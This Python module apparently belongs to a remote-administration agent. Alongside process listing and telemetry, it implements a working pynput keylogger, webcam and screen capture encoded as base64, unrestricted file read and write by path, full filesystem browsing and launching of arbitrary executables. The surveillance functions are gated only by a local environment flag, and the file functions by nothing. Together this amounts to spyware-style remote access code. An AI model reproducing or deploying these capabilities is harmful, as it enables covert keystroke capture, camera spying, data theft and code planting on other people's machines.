from __future__ import annotations

import base64
import os
import platform
import string
import subprocess
import time
from pathlib import Path
from typing import Any
import psutil
from pynput import keyboard


class SystemModules:
    def __init__(self) -> None:
        self.consent = os.getenv("REMOTE_ADMIN_CONSENT", "false").lower() == "true"
        
        self.keylogs = ""
        self.keylogger_listener = None
        # ------------------------------------------------------

    def processes(self) -> list[dict[str, Any]]:
        items = []
        for proc in psutil.process_iter(["pid", "name", "memory_info", "status"]):
            try:
                proc.cpu_percent(None)
                items.append(proc)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        time.sleep(0.1)
        result = []
        for proc in items:
            try:
                info = proc.as_dict(attrs=["pid", "name", "memory_info", "status"])
                rss = info["memory_info"].rss
                result.append({
                    "pid": info["pid"],
                    "name": info["name"] or "unknown",
                    "cpu_percent": round(proc.cpu_percent(None), 1),
                    "ram_mb": round(rss / 1048576, 2),
                    "status": info["status"],
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(result, key=lambda v: (-v["cpu_percent"], -v["ram_mb"]))

    def kill(self, pid: int) -> dict[str, Any]:
        if pid in {0, 4, os.getpid()}:
            return {"ok": False, "error": "protected process"}
        try:
            proc = psutil.Process(pid)
            name = proc.name()
            if name.casefold() in {"system", "system idle process", "registry", "smss.exe", "csrss.exe", "wininit.exe"}:
                return {"ok": False, "error": "protected system process"}
            proc.kill()
            proc.wait(3)
            return {"ok": True, "pid": pid, "name": name}
        except psutil.NoSuchProcess:
            return {"ok": False, "error": "process not found"}
        except psutil.AccessDenied:
            return {"ok": False, "error": "access denied"}
        except psutil.TimeoutExpired:
            return {"ok": False, "error": "termination timeout"}

    def applications(self) -> list[dict[str, Any]]:
        return self.processes()

    def open_application(self, app: str) -> dict[str, Any]:
        commands = {"notepad": ["notepad.exe"], "calculator": ["calc.exe"]}
        if app not in commands:
            return {"ok": False, "error": "application is not allow-listed"}
        subprocess.Popen(commands[app])
        return {"ok": True, "app": app}

    def open_application_by_path(self, path: str) -> dict[str, Any]:
        """Open any application by its full filesystem path."""
        try:
            target = Path(path).resolve()
            if not target.is_file():
                return {"ok": False, "error": f"File không tồn tại: {path}"}
            subprocess.Popen([str(target)], shell=False)
            return {"ok": True, "path": str(target)}
        except PermissionError:
            return {"ok": False, "error": "Không có quyền truy cập"}
        except Exception as error:
            return {"ok": False, "error": str(error)}

    def list_files(self, path: str) -> dict[str, Any]:
        """
        Browse the full filesystem.
        - path="" → returns available drives (Windows) or root (Unix)
        - path=<absolute> → lists contents of that directory
        """
        if not path:
            if platform.system() == "Windows":
                drives = []
                for letter in string.ascii_uppercase:
                    drive = f"{letter}:\\"
                    if os.path.exists(drive):
                        drives.append({
                            "name": drive,
                            "is_dir": True,
                            "size": None,
                            "full_path": drive,
                        })
                return {
                    "ok": True,
                    "current": "",
                    "parent": None,
                    "items": drives,
                }
            else:
                target = Path("/")
        else:
            target = Path(path).resolve()

        parent_path = str(target.parent) if target != target.parent else None

        try:
            items = []
            entries = sorted(
                target.iterdir(),
                key=lambda x: (not x.is_dir(), x.name.lower()),
            )[:500]
            for entry in entries:
                try:
                    size = entry.stat().st_size if entry.is_file() else None
                except (PermissionError, OSError):
                    size = None
                items.append({
                    "name": entry.name,
                    "is_dir": entry.is_dir(),
                    "size": size,
                    "full_path": str(entry),
                })
            return {
                "ok": True,
                "current": str(target),
                "parent": parent_path,
                "items": items,
            }
        except (PermissionError, OSError) as error:
            return {"ok": False, "error": str(error)}

    def telemetry(self) -> dict[str, Any]:
        temperatures = psutil.sensors_temperatures() if hasattr(psutil, "sensors_temperatures") else {}
        values = [entry.current for group in temperatures.values() for entry in group if entry.current is not None]
        return {
            "ok": True,
            "uptime_seconds": int(time.time() - psutil.boot_time()),
            "cpu_percent": psutil.cpu_percent(0.1),
            "ram_percent": psutil.virtual_memory().percent,
            "temperature_c": round(max(values), 1) if values else None,
            "platform": platform.platform(),
        }

    def power_action(self, operation: str) -> dict[str, Any]:
        if os.getenv("ALLOW_POWER_ACTIONS", "false").lower() != "true":
            return {"ok": False, "error": "power actions are disabled locally"}
        commands = {
            "lock": ["rundll32.exe", "user32.dll,LockWorkStation"],
            "sleep": ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"],
            "restart": ["shutdown", "/r", "/t", "15"],
            "shutdown": ["shutdown", "/s", "/t", "15"],
        }
        if operation not in commands:
            return {"ok": False, "error": "invalid power operation"}
        subprocess.Popen(commands[operation])
        return {"ok": True, "operation": operation}

    def snapshot(self, webcam: bool) -> dict[str, Any]:
        if not self.consent:
            return {"ok": False, "error": "local consent is disabled on this Agent"}
        try:
            if webcam:
                import cv2
                camera = cv2.VideoCapture(0)
                ok, frame = camera.read()
                camera.release()
                if not ok:
                    return {"ok": False, "error": "cannot read webcam"}
                ok, encoded = cv2.imencode(".jpg", frame)
                if not ok:
                    return {"ok": False, "error": "cannot encode webcam frame"}
                data = encoded.tobytes()
            else:
                import io
                import mss
                from PIL import Image
                with mss.mss() as capture:
                    shot = capture.grab(capture.monitors[1])
                    image = Image.frombytes("RGB", shot.size, shot.rgb)
                    stream = io.BytesIO()
                    image.save(stream, format="JPEG", quality=70)
                    data = stream.getvalue()
            return {"ok": True, "image_base64": base64.b64encode(data).decode("ascii")}
        except Exception as error:
            return {"ok": False, "error": str(error)}

    def start_keylogger(self) -> dict:
        if not self.consent:
            return {"ok": False, "error": "local consent is disabled on this Agent"}
        if self.keylogger_listener and self.keylogger_listener.running:
            return {"ok": True, "status": "already running"}
        
        def on_press(key):
            try:
                self.keylogs += key.char
            except AttributeError:
                self.keylogs += f" [{key}] "
                
        self.keylogger_listener = keyboard.Listener(on_press=on_press)
        self.keylogger_listener.start()
        return {"ok": True, "status": "started"}

    def get_keylogger(self) -> dict:
        return {"ok": True, "logs": self.keylogs}

    def stop_keylogger(self) -> dict:
        if self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_listener = None
        logs = self.keylogs
        self.keylogs = ""
        return {"ok": True, "logs": logs, "status": "stopped"}

    def read_file(self, path: str) -> dict:
        try:
            with open(path, "rb") as f:
                data = base64.b64encode(f.read()).decode("ascii")
            return {"ok": True, "file_data": data, "filename": os.path.basename(path)}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def write_file(self, path: str, base64_data: str) -> dict:
        try:
            with open(path, "wb") as f:
                f.write(base64.b64decode(base64_data))
            return {"ok": True, "path": path}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def network_connections(self) -> dict:
        try:
            conns = []
            for c in psutil.net_connections(kind='inet'):
                conns.append({
                    "fd": c.fd,
                    "type": str(c.type),
                    "laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                    "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                    "status": c.status,
                    "pid": c.pid
                })
            return {"ok": True, "connections": conns}
        except psutil.AccessDenied:
            return {"ok": False, "error": "access denied - run as admin"}